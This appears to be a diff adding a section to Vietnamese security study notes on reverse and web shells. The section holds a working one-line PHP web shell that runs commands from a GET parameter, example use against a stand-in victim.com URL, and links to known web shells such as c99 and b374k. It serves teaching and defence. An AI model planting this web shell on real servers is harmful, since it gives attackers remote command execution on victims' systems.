@@ -230,3 +230,33 @@ RS này sử dụng **AWK** tạo kết nối TCP để kết nối tới attack
 
 **BusyBox RS** sử dụng netcat để kết nối tới attacker. Khi đã kết nối, nó thực thi `/bin/bash`,  phơi bày dòng lệnh cho attacker
 
+## 7. Web Shell
+**Web Shell** là một đoạn script được viết bằng ngôn ngữ có sẵn trong web server đã bị chiếm quyền, nó có thể thực thi lệnh thông qua chính web server đó. Một Web Shell thường là một file chứa mã thực thi lệnh hệ điều hành và xử lí file. Nó có thể ẩn trong hệ thống và làm cho việc phát hiện khó hơn và là nó cách phổ biến của hầu hết các attacker
+
+Web Shell có thể được viết bẳng những ngôn ngữ được hỗ trợ, có sẵn trên web server như: **PHP, ASP, JSP**
+
+### 1. Example PHP Web SHell
+
+```PHP
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Ví dụ bên trên, shell có thể được lưu ở trong file `.php` sau đó được upload lên web bởi attacker bằng những lỗ hổng như **Unrestricted File Upload, File Inclusion, Command Injection**,... hoặc bằng cách truy cập trái phép vào web
+
+Sau khi web shell được triển khai trên server, nó có thể được thực thi thông qua **URL** nơi mà web shell được lưu trữ, trong ví dụ: `http://victim.com/uploads/shell.php`. Như chứ ta quan sát từ mã nguồn trong `shell.php`, chúng ta cần cung cấp method **GET** và giá trị của biến `cmd`, nó sẽ chứa câu lệnh hệ và thực thi. Nếu muốn thực hiện lệnh `whoami`: `http://victim.com/uploads/shell.php?cmd=whoami`
+
+Ví dụ trên, web sẽ thực thi câu lệnh `whoami` và trả kết quả qua trình duyệt
+
+### 2. Những Web Shell có sẵn trực tuyến
+
+- [p0wny-shell](https://github.com/flozz/p0wny-shell): Một web shell PHP đơn tệp tối giản cho phép thực thi lệnh từ xa. Nó chỉ bao gồm 1 file duy nhất chứa webshell
+<img src="../../images/2026-02-06-17-18-49.png" style="display: block; margin: 0 auto;">
+- [b374k shell ](https://github.com/b374k/b374k): nhiều tính năng hơn với khả năng quản lý tập tin và thực thi lệnh, cùng nhiều chức năng khác.
+<img src="../../images/2026-02-06-17-18-59.png" style="display: block; margin: 0 auto;">
+- [c99 shell](https://www.r57shell.net/single.php?id=13): Một web shell PHP nổi tiếng và mạnh mẽ với nhiều chức năng mở rộng
+<img src="../../images/2026-02-06-17-19-41.png" style="display: block; margin: 0 auto;">
+
